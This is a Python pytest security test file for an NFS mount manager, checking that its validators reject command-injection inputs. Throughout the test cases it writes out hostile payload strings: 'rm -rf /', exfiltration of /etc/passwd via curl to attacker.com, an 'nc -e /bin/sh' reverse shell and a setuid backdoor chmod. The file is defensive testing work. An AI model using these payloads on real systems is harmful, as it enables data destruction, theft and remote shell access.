"""Security tests for nfs_mount_manager module.

Tests all validation helpers against command injection attacks.
Based on SEC-003 security analysis.
"""

import pytest
from pathlib import Path
from unittest.mock import MagicMock, patch

from azlin.modules.nfs_mount_manager import (
    NFSMountManager,
    ValidationError,
    _validate_mount_point,
    _validate_nfs_endpoint,
    _validate_mount_options,
    _validate_storage_name,
)


class TestValidateMountPoint:
    """Test mount point validation against injection attacks."""

    def test_valid_mount_point(self):
        """Valid mount point should pass validation."""
        assert _validate_mount_point("/home/azureuser") == "/home/azureuser"
        assert _validate_mount_point("/mnt/data") == "/mnt/data"
        assert _validate_mount_point("/var/lib/data") == "/var/lib/data"

    def test_reject_command_injection_semicolon(self):
        """Should reject semicolon command separator."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_mount_point("/home/user; rm -rf /")

    def test_reject_command_injection_pipe(self):
        """Should reject pipe command separator."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_mount_point("/home/user | nc attacker.com 1234")

    def test_reject_command_injection_ampersand(self):
        """Should reject ampersand command separator."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_mount_point("/home/user && curl evil.com")

    def test_reject_command_substitution_backticks(self):
        """Should reject backtick command substitution."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_mount_point("/home/`whoami`")

    def test_reject_command_substitution_dollar(self):
        """Should reject dollar command substitution."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_mount_point("/home/$(cat /etc/passwd)")

    def test_reject_wildcard_glob(self):
        """Should reject wildcard characters."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_mount_point("/home/*")

    def test_reject_directory_traversal(self):
        """Should reject directory traversal attempts."""
        with pytest.raises(ValidationError, match="cannot contain"):
            _validate_mount_point("/home/../etc/passwd")

    def test_reject_newline_injection(self):
        """Should reject newline injection."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_mount_point("/home/user\nrm -rf /")

    def test_reject_quote_injection_single(self):
        """Should reject single quote injection."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_mount_point("/home/user' || 'true")

    def test_reject_quote_injection_double(self):
        """Should reject double quote injection."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_mount_point('/home/user" || "true')

    def test_reject_empty_mount_point(self):
        """Should reject empty mount point."""
        with pytest.raises(ValidationError, match="cannot be empty"):
            _validate_mount_point("")

    def test_reject_relative_path(self):
        """Should reject relative paths."""
        with pytest.raises(ValidationError, match="must be absolute path"):
            _validate_mount_point("home/user")

    def test_reject_redirection(self):
        """Should reject shell redirection."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_mount_point("/home/user > /tmp/output")


class TestValidateNFSEndpoint:
    """Test NFS endpoint validation against injection attacks."""

    def test_valid_nfs_endpoint_azure(self):
        """Valid Azure NFS endpoint should pass."""
        endpoint = "storageacct.file.core.windows.net:/share"
        assert _validate_nfs_endpoint(endpoint) == endpoint

    def test_valid_nfs_endpoint_ip(self):
        """Valid IP-based NFS endpoint should pass."""
        endpoint = "10.0.0.4:/exports/data"
        assert _validate_nfs_endpoint(endpoint) == endpoint

    def test_valid_nfs_endpoint_with_subdirs(self):
        """Valid endpoint with subdirectories should pass."""
        endpoint = "server.domain.com:/path/to/share"
        assert _validate_nfs_endpoint(endpoint) == endpoint

    def test_reject_command_injection_in_server(self):
        """Should reject command injection in server part."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_nfs_endpoint("server.com; rm -rf /:/share")

    def test_reject_command_injection_in_path(self):
        """Should reject command injection in path part."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_nfs_endpoint("server.com:/share; curl evil.com")

    def test_reject_command_substitution(self):
        """Should reject command substitution."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_nfs_endpoint("server.com:/share$(id)")

    def test_reject_directory_traversal(self):
        """Should reject directory traversal in share path."""
        with pytest.raises(ValidationError, match="cannot contain"):
            _validate_nfs_endpoint("server.com:/share/../etc/passwd")

    def test_reject_missing_colon(self):
        """Should reject endpoint without colon separator."""
        with pytest.raises(ValidationError, match="must contain ':' separator"):
            _validate_nfs_endpoint("server.com/share")

    def test_reject_missing_slash(self):
        """Should reject share path not starting with /."""
        with pytest.raises(ValidationError, match="must start with '/'"):
            _validate_nfs_endpoint("server.com:share")

    def test_reject_empty_endpoint(self):
        """Should reject empty endpoint."""
        with pytest.raises(ValidationError, match="cannot be empty"):
            _validate_nfs_endpoint("")

    def test_reject_pipe_in_endpoint(self):
        """Should reject pipe character."""
        with pytest.raises(ValidationError, match="unsafe character"):
            _validate_nfs_endpoint("server.com:/share | nc attacker.com")


class TestValidateMountOptions:
    """Test mount options validation against injection attacks."""

    def test_valid_mount_options(self):
        """Valid mount options should pass."""
        assert _validate_mount_options("sec=sys") == "sec=sys"
        assert _validate_mount_options("rw,relatime") == "rw,relatime"
        assert _validate_mount_options("sec=sys,rw,relatime") == "sec=sys,rw,relatime"

    def test_empty_options(self):
        """Empty options should be allowed."""
        assert _validate_mount_options("") == ""

    def test_reject_command_injection(self):
        """Should reject command injection in options."""
        with pytest.raises(ValidationError, match="invalid characters"):
            _validate_mount_options("rw; rm -rf /")

    def test_reject_space_injection(self):
        """Should reject spaces (could separate commands)."""
        with pytest.raises(ValidationError, match="invalid characters"):
            _validate_mount_options("rw relatime")

    def test_reject_quote_injection(self):
        """Should reject quotes."""
        with pytest.raises(ValidationError, match="invalid characters"):
            _validate_mount_options("rw'exec'")

    def test_reject_command_substitution(self):
        """Should reject command substitution."""
        with pytest.raises(ValidationError, match="invalid characters"):
            _validate_mount_options("rw,$(whoami)")


class TestValidateStorageName:
    """Test storage account name validation."""

    def test_valid_storage_name(self):
        """Valid storage names should pass."""
        assert _validate_storage_name("mystorageacct") == "mystorageacct"
        assert _validate_storage_name("stor123") == "stor123"
        assert _validate_storage_name("abc") == "abc"

    def test_reject_uppercase(self):
        """Should reject uppercase letters."""
        with pytest.raises(ValidationError, match="lowercase alphanumeric"):
            _validate_storage_name("MyStorage")

    def test_reject_special_chars(self):
        """Should reject special characters."""
        with pytest.raises(ValidationError, match="lowercase alphanumeric"):
            _validate_storage_name("storage-account")

    def test_reject_too_short(self):
        """Should reject names < 3 characters."""
        with pytest.raises(ValidationError, match="3-24 characters"):
            _validate_storage_name("ab")

    def test_reject_too_long(self):
        """Should reject names > 24 characters."""
        with pytest.raises(ValidationError, match="3-24 characters"):
            _validate_storage_name("a" * 25)

    def test_reject_empty(self):
        """Should reject empty name."""
        with pytest.raises(ValidationError, match="cannot be empty"):
            _validate_storage_name("")


class TestMountStorageSecurity:
    """Integration tests for mount_storage security."""

    @patch("azlin.modules.nfs_mount_manager.subprocess.run")
    def test_reject_malicious_mount_point(self, mock_run):
        """Should reject malicious mount point before executing commands."""
        with pytest.raises(ValidationError):
            NFSMountManager.mount_storage(
                "1.2.3.4",
                Path("/fake/key"),
                "server:/share",
                mount_point="/home/user; rm -rf /",
            )
        # No commands should be executed
        assert mock_run.call_count == 0

    @patch("azlin.modules.nfs_mount_manager.subprocess.run")
    def test_reject_malicious_nfs_endpoint(self, mock_run):
        """Should reject malicious NFS endpoint before executing commands."""
        with pytest.raises(ValidationError):
            NFSMountManager.mount_storage(
                "1.2.3.4",
                Path("/fake/key"),
                "server:/share; curl evil.com",
            )
        # No commands should be executed
        assert mock_run.call_count == 0

    @patch("azlin.modules.nfs_mount_manager.subprocess.run")
    def test_safe_after_validation(self, mock_run):
        """Valid inputs should work normally after validation."""
        mock_run.return_value = MagicMock(returncode=0, stdout="")

        result = NFSMountManager.mount_storage(
            "1.2.3.4",
            Path("/fake/key"),
            "server.com:/share",
        )

        # Commands should be executed
        assert mock_run.call_count > 0
        assert result.success is True


class TestUnmountStorageSecurity:
    """Integration tests for unmount_storage security."""

    @patch("azlin.modules.nfs_mount_manager.subprocess.run")
    def test_reject_malicious_mount_point(self, mock_run):
        """Should reject malicious mount point before executing commands."""
        with pytest.raises(ValidationError):
            NFSMountManager.unmount_storage(
                "1.2.3.4",
                Path("/fake/key"),
                mount_point="/home/user | nc attacker.com",
            )
        # No commands should be executed
        assert mock_run.call_count == 0


class TestVerifyMountSecurity:
    """Integration tests for verify_mount security."""

    @patch("azlin.modules.nfs_mount_manager.subprocess.run")
    def test_reject_malicious_mount_point(self, mock_run):
        """Should reject malicious mount point before executing commands."""
        with pytest.raises(ValidationError):
            NFSMountManager.verify_mount(
                "1.2.3.4",
                Path("/fake/key"),
                mount_point="/home/user$(whoami)",
            )
        # No commands should be executed
        assert mock_run.call_count == 0


class TestGetMountInfoSecurity:
    """Integration tests for get_mount_info security."""

    @patch("azlin.modules.nfs_mount_manager.subprocess.run")
    def test_reject_malicious_mount_point(self, mock_run):
        """Should reject malicious mount point before executing commands."""
        with pytest.raises(ValidationError):
            NFSMountManager.get_mount_info(
                "1.2.3.4",
                Path("/fake/key"),
                mount_point="/home/user`id`",
            )
        # No commands should be executed
        assert mock_run.call_count == 0


class TestAttackVectors:
    """Test specific attack vectors from SEC-003 analysis."""

    def test_attack_vector_1_command_chaining(self):
        """Attack Vector 1: Command chaining with semicolon."""
        malicious_input = "/home/user; curl http://attacker.com/exfil?data=$(cat /etc/passwd)"
        with pytest.raises(ValidationError):
            _validate_mount_point(malicious_input)

    def test_attack_vector_2_command_substitution(self):
        """Attack Vector 2: Command substitution in mount point."""
        malicious_input = "/home/$(whoami)/data"
        with pytest.raises(ValidationError):
            _validate_mount_point(malicious_input)

    def test_attack_vector_3_sed_delimiter_injection(self):
        """Attack Vector 3: sed delimiter injection in fstab removal."""
        # The sed command uses | as delimiter, so | in mount point would break it
        malicious_input = "/home/user|d|"
        with pytest.raises(ValidationError):
            _validate_mount_point(malicious_input)

    def test_attack_vector_4_grep_injection(self):
        """Attack Vector 4: grep injection in mount verification."""
        # grep without quoting is vulnerable to pattern injection
        malicious_input = "/home/user[[:space:]]nfs"
        with pytest.raises(ValidationError):
            _validate_mount_point(malicious_input)

    def test_attack_vector_5_path_traversal(self):
        """Attack Vector 5: Directory traversal to access sensitive files."""
        malicious_input = "/home/../etc/passwd"
        with pytest.raises(ValidationError):
            _validate_mount_point(malicious_input)

    def test_attack_vector_6_nfs_endpoint_injection(self):
        """Attack Vector 6: NFS endpoint with command injection."""
        malicious_input = "server.com:/share; nc -e /bin/sh attacker.com 4444"
        with pytest.raises(ValidationError):
            _validate_nfs_endpoint(malicious_input)

    def test_attack_vector_7_mount_options_injection(self):
        """Attack Vector 7: Mount options with privilege escalation."""
        malicious_input = "rw,exec; chmod 4755 /tmp/backdoor"
        with pytest.raises(ValidationError):
            _validate_mount_options(malicious_input)


class TestValidationHelperExported:
    """Test that ValidationError is properly exported."""

    def test_validation_error_importable(self):
        """ValidationError should be importable from public API."""
        from azlin.modules.nfs_mount_manager import ValidationError as VE
        assert VE is ValidationError
